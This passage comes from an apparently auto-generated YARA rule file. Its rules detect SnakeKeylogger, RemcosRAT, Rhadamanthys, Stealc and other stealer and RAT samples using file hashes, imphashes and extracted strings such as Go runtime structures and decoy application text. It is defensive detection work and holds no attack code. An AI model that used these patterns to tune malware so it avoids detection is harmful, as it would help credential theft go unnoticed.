      hash10 = "c3f26585fd9cf218077198e642eabb9a8468f092d8a9138b43e7f68c832df64a"
      hash11 = "dd620aedd68431d93bf160121019e21774e7e4955f7be863486c5a699b1187c7"
   strings:
      $s1 = "q*struct { lock runtime.mutex; newm runtime.muintptr; waiting bool; wake runtime.note; haveTemplateThread uint32 }" fullword ascii /* score: '25.00'*/
      $s2 = "2*struct { lock runtime.mutex; lockOwner *runtime.g; enabled bool; shutdown bool; headerWritten bool; footerWritten bool; shutdo" ascii /* score: '23.00'*/
      $s3 = "2*struct { lock runtime.mutex; lockOwner *runtime.g; enabled bool; shutdown bool; headerWritten bool; footerWritten bool; shutdo" ascii /* score: '23.00'*/
      $s4 = "type..eq.struct { runtime.lock runtime.mutex; runtime.newm runtime.muintptr; runtime.waiting bool; runtime.wake runtime.note; ru" ascii /* score: '20.00'*/
      $s5 = "ckTab runtime.traceStackTable; stringsLock runtime.mutex; strings map[string]uint64; stringSeq uint64; markWorkerLabels [3]uint6" ascii /* score: '18.00'*/
      $s6 = "*struct { lock runtime.mutex; free *runtime.gcBitsArena; next *runtime.gcBitsArena; current *runtime.gcBitsArena; previous *runt" ascii /* score: '18.00'*/
      $s7 = "e*struct { lock runtime.mutex; next int32; m map[int32]unsafe.Pointer; minv map[unsafe.Pointer]int32 }" fullword ascii /* score: '18.00'*/
      $s8 = "N*struct { lock runtime.mutex; free runtime.mSpanList; busy runtime.mSpanList }" fullword ascii /* score: '18.00'*/
      $s9 = "2*struct { runtime.mutex; runtime.persistentAlloc }" fullword ascii /* score: '18.00'*/
      $s10 = ":*struct { lock runtime.mutex; free [35]runtime.mSpanList }" fullword ascii /* score: '18.00'*/
      $s11 = "4; bufLock runtime.mutex; buf runtime.traceBufPtr }" fullword ascii /* score: '18.00'*/
      $s12 = "*struct { lock runtime.mutex; free *runtime.gcBitsArena; next *runtime.gcBitsArena; current *runtime.gcBitsArena; previous *runt" ascii /* score: '18.00'*/
      $s13 = "ntime.haveTemplateThread uint32 }" fullword ascii /* score: '17.00'*/
      $s14 = "runtime.(*gcSweepBuf).pop" fullword ascii /* score: '15.00'*/
      $s15 = "haveTemplateThread" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and ( 8 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__9f4693fc0c511135129493f2161d1e86_imphash__SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a_46 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_9f4693fc0c511135129493f2161d1e86(imphash).exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_144c0630.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c0f5dd3c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "86073c2058e6ccd233b12878ac2b97da3fbf9a5e7f79ec959e0693237f7aba4b"
      hash2 = "144c0630ec23ef25922d5af40c7754cc00c7e35df7ec0faf1fba807e36401f1b"
      hash3 = "c0f5dd3cd5939bb1f1c392c49bd474bd5987c07010b2528f3fe29d8906bf0460"
   strings:
      $s1 = "Core.Infrastructure.Logging" fullword ascii /* score: '16.00'*/
      $s2 = "System.Collections.Generic.IEnumerable<TType>.GetEnumerator" fullword ascii /* score: '15.00'*/
      $s3 = "GetInfoScript" fullword ascii /* score: '15.00'*/
      $s4 = "GetWarningScript" fullword ascii /* score: '15.00'*/
      $s5 = "GetSuccessScript" fullword ascii /* score: '15.00'*/
      $s6 = "GetFatalScript" fullword ascii /* score: '15.00'*/
      $s7 = "System.Collections.Generic.IEnumerator<TType>.get_Current" fullword ascii /* score: '15.00'*/
      $s8 = "GetSpecByContentType" fullword ascii /* score: '14.00'*/
      $s9 = "<GetSpecByContentType>b__0" fullword ascii /* score: '14.00'*/
      $s10 = "StructureMap.Configuration.DSL.Expressions" fullword ascii /* score: '13.00'*/
      $s11 = "StructureMap.Pipeline" fullword ascii /* score: '13.00'*/
      $s12 = "StructureMap.Configuration.DSL" fullword ascii /* score: '13.00'*/
      $s13 = "BuildTemplate" fullword ascii /* score: '11.00'*/
      $s14 = "(http|https)://([\\w-]+\\.)+[\\w-]+(/[\\w- ./?%&=]*)?" fullword wide /* score: '11.00'*/
      $s15 = "Attempting to add {0}" fullword wide /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__fe60a7df_SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c_47 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_fe60a7df.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b225beef.exe, Stealerium(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e0debd3d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "fe60a7df5bc022b0e471bf083116a1657e8181a87f26727bee92ec7e8eb2fae8"
      hash2 = "b225beef2338636503b1d0e3f9d43ec35ff0e2d3b271904b4fcafe2c3bc48c01"
      hash3 = "e0debd3d856bc96dc136c9477707ad7da3288c6e57e7040ad7e904fb589f4ef5"
   strings:
      $s1 = "statistics.dat" fullword wide /* score: '14.00'*/
      $s2 = "highscores.dat" fullword wide /* score: '14.00'*/
      $s3 = "GetCompletionRate" fullword ascii /* score: '12.00'*/
      $s4 = "<GetAverageCompletionTime>b__32_0" fullword ascii /* score: '12.00'*/
      $s5 = "get_CompletionTime" fullword ascii /* score: '12.00'*/
      $s6 = "GetAverageCompletionTime" fullword ascii /* score: '12.00'*/
      $s7 = "get_TotalGamesCompleted" fullword ascii /* score: '12.00'*/
      $s8 = "get_CompletionTimes" fullword ascii /* score: '12.00'*/
      $s9 = "get_GamesCompleted" fullword ascii /* score: '12.00'*/
      $s10 = "{0} - {1:mm\\:ss} - Score: {2}" fullword wide /* score: '12.00'*/
      $s11 = "Game Started - {0} Difficulty" fullword wide /* score: '12.00'*/
      $s12 = "Grid is valid - {0} cells remaining" fullword wide /* score: '12.00'*/
      $s13 = "tempScore" fullword ascii /* score: '11.00'*/
      $s14 = "SudokuStats_{0:yyyy-MM-dd}.csv" fullword wide /* score: '10.00'*/
      $s15 = "Error exporting statistics: " fullword wide /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 21000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7f46e341_RemcosRAT_signature__a8741f2d_48 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7f46e341.js, RemcosRAT(signature)_a8741f2d.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7f46e341e906e3c3b4b9ce3748f426f27fd808d904a1fe2a0706c690e0613132"
      hash2 = "a8741f2d62f81c47812fd549d14aea8d5872afb9b9788d69c6f14d5bf6fc74ac"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                             ' */ /* score: '26.50'*/
      $s2 = "AAAAAAAAAACgAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4AEAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '       ( @                             0 @                             8 @                     ' */ /* score: '21.00'*/
      $s3 = "AAAAAAAAAACwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '       ,                               0                               4                       ' */ /* score: '21.00'*/
      $s4 = "dD99P6Y/rz/hP+g/AAAAQAAAgAAAAAgwWTCOMP8wQzFPMZcyvzLGMt4yADM0MzwzRzNzM30ziDOZM9gz7jMFNDo0PjRENEg0TTRUNFo0YjRtNMg00DT8NAg1LDU2NVs1" ascii /* score: '17.00'*/
      $s5 = "AAEAAAAAAAAA" ascii /* base64 encoded string ' @      ' */ /* score: '16.50'*/
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAD" ascii /* base64 encoded string '                     ' */ /* score: '16.50'*/
      $s7 = "AAAAAAAAAAAAAAAAD" ascii /* base64 encoded string '            ' */ /* score: '16.50'*/
      $s8 = "AAAAAEAAAC" ascii /* base64 encoded string '    @  ' */ /* score: '16.50'*/
      $s9 = "AAAAAAABAAAAA" ascii /* base64 encoded string '     @   ' */ /* score: '16.50'*/
      $s10 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAC" ascii /* base64 encoded string '                    ' */ /* score: '16.50'*/
      $s11 = "AAAAAEAAAA" ascii /* base64 encoded string '    @  ' */ /* score: '16.50'*/
      $s12 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                      ' */ /* score: '16.50'*/
      $s13 = "AAAAAAAAAAAAE" ascii /* base64 encoded string '         ' */ /* score: '16.50'*/
      $s14 = "Sfh1J1CJyDHJikoBi1QRBoXSdA6LSPyFyXQHixLomPr//4PoCOh01P//WMOLwFOLGIXSdATw/0L4hdt0FPD/S/h1DlBSicr/Q/joo////1pYiRBbw5CDxORqHI1UJARS" ascii /* score: '16.00'*/
      $s15 = "N4l+BDPA6wODyP/GBaQnVwAAX15bw41QA8HqAz0sCgAAU4oNSQBXAA+HLAIAAITJD7aCvAVXAI0cxUDgRgB1VotTBItCCLn4////Odp0F4NCDAEjSPyJSgiJUPx0KMYD" ascii /* score: '16.00'*/
   condition:
      ( uint16(0) == 0x6176 and filesize < 6000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c8b88d11d_imphash__Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c8b88d11d__49 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32687360.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32cfff30.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_516d9dae.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_552543de.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_5840ea1c.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b4fd170f.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b7b7d002.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_c3f26585.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_dd620aed.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "03fe53eff294a718d3a887e23e2e83c98c55e8b6b5654bbc6650400f011604ad"
      hash2 = "32687360fdc4dad7137f1937bd995ca4591cb65f8ca607fa48d1a394cc4a824b"
      hash3 = "32cfff30d6ed1f3395b8ffbc8319fad8723f71547364a6cde2faddb2b80b5b1d"
      hash4 = "516d9daee48799c22090e64835e99df3d6a6384e9305bfa90287486c4e9881be"
      hash5 = "552543dea61279d3a283976db9ef74cb33d9ab66aba5ac3bb6203ffbcf141206"
      hash6 = "5840ea1c615a9daee7648736117ddce1c7c6e2143bf3b971e6828989e094edc4"
      hash7 = "b4fd170f2d56421678f4743cba758fb69779b4bfd0f77202dbfc760d8ed1c8e5"
      hash8 = "b7b7d00276073da29572e3dee367869d603ec7f64080a8bf99a8226ece840375"
      hash9 = "c3f26585fd9cf218077198e642eabb9a8468f092d8a9138b43e7f68c832df64a"
      hash10 = "dd620aedd68431d93bf160121019e21774e7e4955f7be863486c5a699b1187c7"
   strings:
      $x1 = "me.mutex; runtime.head runtime.guintptr; runtime.tail runtime.guintptr }; runtime.sweepWaiters struct { runtime.lock runtime.mut" ascii /* score: '31.00'*/
      $x2 = "time.mutex; runtime.head runtime.guintptr; runtime.tail runtime.guintptr }; runtime.sweepWaiters struct { runtime.lock runtime.m" ascii /* score: '31.00'*/
      $s3 = "; head runtime.guintptr; tail runtime.guintptr }; sweepWaiters struct { lock runtime.mutex; head runtime.guintptr }; cycles uint" ascii /* score: '28.00'*/
      $s4 = "*struct { full runtime.lfstack; empty runtime.lfstack; pad0 [64]uint8; wbufSpans struct { lock runtime.mutex; free runtime.mSpan" ascii /* score: '27.00'*/
      $s5 = "L*struct { lock runtime.mutex; head runtime.guintptr; tail runtime.guintptr }" fullword ascii /* score: '23.00'*/
      $s6 = "5*struct { lock runtime.mutex; head runtime.guintptr }" fullword ascii /* score: '23.00'*/
      $s7 = "type..hash.struct { runtime.lock runtime.mutex; runtime.newm runtime.muintptr; runtime.waiting bool; runtime.wake runtime.note; " ascii /* score: '23.00'*/
      $s8 = "type..hash.struct { runtime.full runtime.lfstack; runtime.empty runtime.lfstack; runtime.pad0 [64]uint8; runtime.wbufSpans struc" ascii /* score: '22.00'*/
      $s9 = "CreateHardLinkWDeviceIoControlDuplicateHandleFailed to find Failed to load FlushViewOfFileGetAdaptersInfoGetCommandLineWGetProce" ascii /* score: '22.00'*/
      $s10 = "type..eq.struct { runtime.full runtime.lfstack; runtime.empty runtime.lfstack; runtime.pad0 [64]uint8; runtime.wbufSpans struct " ascii /* score: '22.00'*/
      $s11 = "e uint32; mode runtime.gcMode; userForced bool; totaltime int64; initialHeapLive uint64; assistQueue struct { lock runtime.mutex" ascii /* score: '21.00'*/
      $s12 = "*struct { full runtime.lfstack; empty runtime.lfstack; pad0 [64]uint8; wbufSpans struct { lock runtime.mutex; free runtime.mSpan" ascii /* score: '18.00'*/
      $s13 = "t { runtime.lock runtime.mutex; runtime.free runtime.mSpanList; runtime.busy runtime.mSpanList }; _ uint32; runtime.bytesMarked " ascii /* score: '18.00'*/
      $s14 = "{ runtime.lock runtime.mutex; runtime.free runtime.mSpanList; runtime.busy runtime.mSpanList }; _ uint32; runtime.bytesMarked ui" ascii /* score: '18.00'*/
      $s15 = "ex; runtime.head runtime.guintptr }; runtime.cycles uint32; runtime.stwprocs int32; runtime.maxprocs int32; runtime.tSweepTerm i" ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and pe.imphash() == "a520fd20530cf0b0db6a6c3c8b88d11d" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__cb9e4229_SnakeKeylogger_signature__f34d5f2d4577ed6d9cee_50 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_cb9e4229.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_fd4f3cae.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cb9e4229b8283a6e61bcaf9516cf7b49e6bf415c5bbce9eece7f7b9f0b6e97d5"
      hash2 = "fd4f3cae85f47c07738745df4c1bd449805aaecc72bba20e6312d02e5486e5fc"
   strings:
      $s1 = "secrter" fullword ascii /* score: '8.00'*/
      $s2 = "baglanti" fullword ascii /* score: '8.00'*/
      $s3 = "sqlbaglantisi" fullword ascii /* score: '8.00'*/
      $s4 = "Select * From Tbl_Hastalar where HastaTc=@p1" fullword wide /* score: '8.00'*/
      $s5 = "Select * From Tbl_Branslar" fullword wide /* score: '8.00'*/
      $s6 = "Select * From Tbl_Doktorlar where DoktorTC=@p1" fullword wide /* score: '8.00'*/
      $s7 = "Select * From Tbl_Randevular where RandevuDoktor = '" fullword wide /* score: '8.00'*/
      $s8 = "Select * From Tbl_Doktorlar where DoktorTC=@p1 and DoktorSifre=@p2" fullword wide /* score: '8.00'*/
      $s9 = "Select * From Tbl_Doktorlar" fullword wide /* score: '8.00'*/
      $s10 = "Select * From Tbl_Duyurular" fullword wide /* score: '8.00'*/
      $s11 = "Select * From Tbl_Randevular where HastaTC=" fullword wide /* score: '8.00'*/
      $s12 = "Select * From Tbl_Randevular where RandevuBrans = '" fullword wide /* score: '8.00'*/
      $s13 = "Select * From Tbl_Hastalar where HastaTC=@p1 and HastaSifre=@p2" fullword wide /* score: '8.00'*/
      $s14 = "Select * From Tbl_Randevular" fullword wide /* score: '8.00'*/
      $s15 = "Select (DoktorAd + ' ' + DoktorSoyad) as 'Doktorlar' , DoktorBrans From Tbl_Doktorlar" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__7ff80d32_SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c_51 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_7ff80d32.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3a882b87.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_44b56974.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_544d7bd4.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_61815887.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ac1e20be.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7ff80d32942d56f7c816287478657d30b2ccbbd6cd904d86cf710ef07e3105bf"
      hash2 = "3a882b870fce4e6cc303d89551e6b36741aedf2a97dc8a20163e964a0808f22b"
      hash3 = "44b569741123469cd19a343c8b33de6e24d77b26763d4692e070aa2b10a3a960"
      hash4 = "544d7bd464f262cdfda14e6df09a8b4ba3210867c0955eebc4e86d757f861238"
      hash5 = "6181588754a45750b20eee8e9d3844f14d85b0869bb860134cc240ac6f6d90dd"
      hash6 = "ac1e20be199c6cfcb9ab3f26995b204262dc4db69063e8fbb09cbac8630cee21"
   strings:
      $s1 = "Unit Converter - Conversion History Report" fullword wide /* score: '20.00'*/
      $s2 = "Conversion History - Unit Converter" fullword wide /* score: '17.00'*/
      $s3 = "GetUnitDescription" fullword ascii /* score: '15.00'*/
      $s4 = "Unsupported file format. Use .csv or .txt" fullword wide /* score: '14.00'*/
      $s5 = "Settings - Unit Converter" fullword wide /* score: '14.00'*/
      $s6 = "ConversionHistory_{0:yyyyMMdd}.csv" fullword wide /* score: '13.00'*/
      $s7 = "GetRecentConversions" fullword ascii /* score: '12.00'*/
      $s8 = "GetMostUsedConversions" fullword ascii /* score: '12.00'*/
      $s9 = "<GetMostUsedConversions>b__20_2" fullword ascii /* score: '12.00'*/
      $s10 = "<GetMostUsedConversions>b__20_0" fullword ascii /* score: '12.00'*/
      $s11 = "GetConversions" fullword ascii /* score: '12.00'*/
      $s12 = "<GetMostUsedConversions>b__20_1" fullword ascii /* score: '12.00'*/
      $s13 = "Export Conversion History" fullword wide /* score: '12.00'*/
      $s14 = "ConvertTemperature" fullword ascii /* score: '11.00'*/
      $s15 = "Kilogram" fullword wide /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c8b88d11d_imphash__Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c8b88d11d__52 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_552543de.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b4fd170f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "03fe53eff294a718d3a887e23e2e83c98c55e8b6b5654bbc6650400f011604ad"
      hash2 = "552543dea61279d3a283976db9ef74cb33d9ab66aba5ac3bb6203ffbcf141206"
      hash3 = "b4fd170f2d56421678f4743cba758fb69779b4bfd0f77202dbfc760d8ed1c8e5"
   strings:
      $s1 = "~}|{zyxwvutsrqponmlkjihg" fullword ascii /* reversed goodware string 'ghijklmnopqrstuvwxyz{|}~' */ /* score: '14.00'*/
      $s2 = "~}|{zyxwvutsrqponmlkjihgfedcba" fullword ascii /* reversed goodware string 'abcdefghijklmnopqrstuvwxyz{|}~' */ /* score: '14.00'*/
      $s3 = "rrgixriee" fullword ascii /* score: '8.00'*/
      $s4 = "rgiygvee" fullword ascii /* score: '8.00'*/
      $s5 = "zioxzykxee" fullword ascii /* score: '8.00'*/
      $s6 = "rrgizyglee" fullword ascii /* score: '8.00'*/
      $s7 = "rikjiee" fullword ascii /* score: '8.00'*/
      $s8 = "rrgiyonzee" fullword ascii /* score: '8.00'*/
      $s9 = "xuzgxkvu" fullword ascii /* score: '8.00'*/
      $s10 = "rrgijzyee" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and pe.imphash() == "a520fd20530cf0b0db6a6c3c8b88d11d" and ( all of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__198098fa616880c50e48e8c22b284156_imphash__SnakeKeylogger_signature__636312a5ec1f8b9f790598a6e097c5a_53 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_198098fa616880c50e48e8c22b284156(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash)_082c1741.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "faff87c6bdf6c63216c2507eee89ae434cce7da8a940373e0ace694798b976c7"
      hash2 = "cbc7b8123f7ef72341952e2e1acb4b8debdb0e3df2ecfcce92eedf95e208e63d"
      hash3 = "082c17414af12072323ba9f4c1b1ce57491434032ff5f339374866dea3dfcc09"
   strings:
      $s1 = "$System.Console.dll&System.IO.Pipelines" fullword ascii /* score: '25.00'*/
      $s2 = "@System.Security.Cryptography.dll2System.Text.Encodings.Web" fullword ascii /* score: '19.00'*/
      $s3 = ":System.Text.Encodings.Web.dll System.Text.Json" fullword ascii /* score: '19.00'*/
      $s4 = "System.Text.Encodings.Web.JavaScriptEncoder{" fullword ascii /* score: '16.00'*/
      $s5 = "System.IO.Pipelines.Tests, PublicKey=00240000048000009400000006020000002400005253413100040000010001004b86c4cb78549b34bab61a3b180" ascii /* score: '16.00'*/
      $s6 = "System.IO.Pipelines.Tests, PublicKey=00240000048000009400000006020000002400005253413100040000010001004b86c4cb78549b34bab61a3b180" ascii /* score: '16.00'*/
      $s7 = "zThrowInvalidOperationException_TypeDoesNotSupportPolymorphismlThrowInvalidOperationException_DerivedTypeNotSupportedxThrowInval" ascii /* score: '15.00'*/
      $s8 = "System.IO.Pipelines.PipeWriter" fullword ascii /* score: '13.00'*/
      $s9 = "System.IO.Pipelines.Pipe" fullword ascii /* score: '13.00'*/
      $s10 = "System.Text.Encodings.Web.HtmlEncoder" fullword ascii /* score: '13.00'*/
      $s11 = "get_NewLineHget_CanUseFastPathSerializationLogic4ConfigureForJsonSerializer(GetTypeInfoNoCaching@" fullword ascii /* score: '13.00'*/
      $s12 = "System.Text.Encodings.Web.UrlEncoder" fullword ascii /* score: '13.00'*/
      $s13 = "ble0get_IgnoreReadOnlyMember" fullword ascii /* score: '12.00'*/
      $s14 = "HTryGetPolymorphicTypeInfoForRootType@" fullword ascii /* score: '12.00'*/
      $s15 = "ThrowInvalidOperationException_PolymorphicTypeConfigurationDoesNotSpecifyDerivedTypes" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 14000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__91802a615b3a5c4bcc05bc5f66a5b219__54 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Sliver(signature)_c2d457ad8ac36fc9f18d45bffcd450c2(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d75aad03.exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash)_837a5ae1.exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "7dcf3101452546647c0a3b55519db6ba479c7169067e35d8db41b8ff45028247"
      hash3 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash4 = "d15e35dcb836d038d70b217709261b6a29c1d871c16304368b18ece21b989878"
      hash5 = "ed370fcbafa43b4b578d5722e922e706dd854189e5a5b9ca17213c307b3f9a23"
      hash6 = "d75aad0391ff8c63fba6f7315e520f5ea61229591277b09240e48e185e435eea"
      hash7 = "31294603a887756a97d1f8b3b5f8a0f3ece03907448ea717dfc8b4d017be5897"
      hash8 = "837a5ae11a55ee51f20f6e1377a714730fe4df1914d22529064a70008393dca8"
      hash9 = "faed38b89c09070971844291bfefe437592451789e389ab38e3396ff84e49159"
      hash10 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "runtime.envKeyEqual" fullword ascii /* score: '18.00'*/
      $s2 = "runtime.(*mSpanStateBox).get" fullword ascii /* score: '15.00'*/
      $s3 = "runtime.isSweepDone" fullword ascii /* score: '15.00'*/
      $s4 = "runtime.pallocSum.end" fullword ascii /* score: '13.00'*/
      $s5 = "runtime.strhashFallback" fullword ascii /* score: '13.00'*/
      $s6 = "runtime.boundsError.Error" fullword ascii /* score: '13.00'*/
      $s7 = "runtime.memhash32Fallback" fullword ascii /* score: '13.00'*/
      $s8 = "runtime.(*stackScanState).getPtr" fullword ascii /* score: '13.00'*/
      $s9 = "errors.New" fullword ascii /* score: '13.00'*/
      $s10 = "runtime.memhashFallback" fullword ascii /* score: '13.00'*/
      $s11 = "runtime.pallocSum.max" fullword ascii /* score: '13.00'*/
      $s12 = "runtime.memhash64Fallback" fullword ascii /* score: '13.00'*/
      $s13 = "runtime.chanparkcommit" fullword ascii /* score: '13.00'*/
      $s14 = "runtime.schedEnableUser" fullword ascii /* score: '13.00'*/
      $s15 = "runtime.binarySearchTree" fullword ascii /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7d55bce71f04e2295549851ae8e8438c_imphash__Rhadamanthys_signature__198098fa616880c50e48e8c22b284156_imp_55 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7d55bce71f04e2295549851ae8e8438c(imphash).exe, Rhadamanthys(signature)_198098fa616880c50e48e8c22b284156(imphash).exe, SnakeKeylogger(signature)_995cce3d6fb20b2d8af502c8788f55d7(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b052c0a60681008a7ebd4b9797badf24129a8710c0ec56fe560c14c61c44f79"
      hash2 = "faff87c6bdf6c63216c2507eee89ae434cce7da8a940373e0ace694798b976c7"
      hash3 = "faa45b0c9550932a04ceb9a608e53f3688215a757eab77c264d135a149466984"
   strings:
      $s1 = "8TryGetByRefTypeForTargetType,GetByRefTypeTargetType&TryGetMethodInvoker@" fullword ascii /* score: '18.00'*/
      $s2 = "GetEmptyIfEmpty" fullword ascii /* score: '16.00'*/
      $s3 = "tTryGetConstructedGenericTypeForComponentsNoConstraintCheckBMethodInvokerWithMethodInvokeInfo*InstanceMethodInvoker" fullword ascii /* score: '16.00'*/
      $s4 = "FReflectionDomainSetupImplementationDExecutionEnvironmentImplementation[" fullword ascii /* score: '16.00'*/
      $s5 = "`ReflectionExecutionDomainCallbacksImplementation MethodInvokeInfo" fullword ascii /* score: '16.00'*/
      $s6 = "4TryGetNonGcStaticFieldData.TryGetGcStaticFieldData6TryGetThreadStaticFieldDataFGetThreadStaticGCDescForDynamicType@" fullword ascii /* score: '15.00'*/
      $s7 = "(ThrowTargetException@" fullword ascii /* score: '14.00'*/
      $s8 = "Object does not match target type" fullword wide /* score: '14.00'*/
      $s9 = "IsPrimitiveType GetMethodInvoker@" fullword ascii /* score: '13.00'*/
